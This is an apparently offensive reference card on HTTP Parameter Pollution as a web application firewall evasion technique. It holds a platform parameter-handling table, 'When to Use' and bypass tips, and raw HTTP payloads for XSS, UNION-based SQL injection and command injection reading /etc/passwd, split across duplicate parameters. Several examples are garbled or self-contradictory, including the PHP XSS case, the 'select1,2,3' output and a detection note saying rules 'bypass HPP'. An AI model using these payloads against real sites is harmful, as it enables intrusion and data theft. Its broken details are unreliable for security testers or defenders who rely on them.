---
id: WAF-EVASION-13
title: HTTP Parameter Pollution (HPP)
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-13: HTTP Parameter Pollution (HPP)

## Summary

HTTP Parameter Pollution (HPP) exploits the different ways that web application platforms handle multiple HTTP parameters with the same name. By splitting an attack payload across multiple instances of the same parameter, an attacker can bypass WAF rules that only inspect individual parameter values, while the backend reconstructs the full payload according to its platform-specific parameter precedence rules.

## When to Use

- Against WAFs that inspect each parameter value independently without considering parameter aggregation
- When the backend platform's parameter merging behavior is known or can be identified
- In combination with other injection techniques (SQLi, XSS, SSI, template injection)
- When the application processes multiple parameters with the same name

## Technique Details

Each web platform handles duplicate parameters differently:

| Environment | Behavior | Example |
|-------------|----------|---------|
| ASP/IIS | Concatenation by comma | `?a=1&a=2` -> `1,2` |
| JSP/Tomcat | First parameter wins | `?a=1&a=2` -> `1` |
| ASP.NET/IIS | Concatenation by comma | `?a=1&a=2` -> `1,2` |
| PHP/Apache | Last parameter wins | `?a=1&a=2` -> `2` |
| PHP/Zeus | Last parameter wins | `?a=1&a=2` -> `2` |
| Python/Zope | First parameter wins | `?a=1&a=2` -> `1` |
| IceWarp | Array returned | `?a=1&a=2` -> `['1','2']` |
| DBMan | Concatenation by ~~ | `?a=1&a=2` -> `1~~2` |

The WAF checks `?q=<script>` and finds no match. The backend reconstructs `?q=<script>&q=alert(1)&q=</script>` into the full payload.

## Payload Examples

```http
# HPP for XSS on PHP backend (last parameter wins)
GET /search?q=<script>&q=alert(1)&q=</script> HTTP/1.1
Host: target.com
# WAF sees: q=<script>, q=alert(1), q=</script> (each may be benign alone)
# PHP receives: q=</script> (last value) — but with reconstruction tricks

# HPP for SQL injection on ASP.net backend (comma concatenation)
GET /products?id=1&id=UNION&id=SELECT&id=1,2,3 HTTP/1.1
Host: target.com
# ASP.net receives: id=1,UNION,SELECT,1,2,3

# HPP for command injection on JSP backend (first wins but others processed)
GET /cmd?param=127.0.0.1&param=;cat&param=/etc/passwd HTTP/1.1
Host: target.com

# HPP with parameter splitting across multiple sources (GET + POST)
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

q=<script>alert(1)</script>&q=legitimate

# HPP for SQL injection with comment filling
GET /user?id=1&id=/*&id=union&id=*/&id=select&id=1,2,3 HTTP/1.1
Host: target.com
# SQL level: 1/*union*/select1,2,3 -> 1 union select 1,2,3 (with MySQL comments)
```

```html
<!-- Client-side HPP (JavaScript parsing) -->
<script>
  // Some frameworks collect all values of the same parameter
  var params = new URLSearchParams(window.location.search);
  var q = params.getAll('q');  // returns array
  eval(q.join(''));  // dynamic execution
</script>
```

## Detection & Bypass Notes

**Detection:**
- WAFs that aggregate duplicate parameters (following the backend's behavior) before inspection are resistant.
- WAFs that inspect the raw query string as a whole rather than parsed parameters can detect HPP.
- Rules that match across parameter boundaries (e.g., regex on the full query string) bypass HPP.

**Bypass:**
- Identify the platform first (Server header, error pages, cookie names) to determine parameter precedence.
- For ASP.NET, use commas in the first parameter to join them: `?a=1,2&a=3` → `1,2,3`.
- For PHP, override with the last value: `?q=benign&q=<script>alert(1)</script>`.
- Combine HPP with HPF (HTTP Parameter Fragmentation) for multi-dimensional obfuscation.
- Use parameter arrays in PHP: `?a[]=select&a[]>=&a[]=1` can confuse some WAF parsers.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution
- https://portswigger.net/web-security/ssrf#parameter-pollution
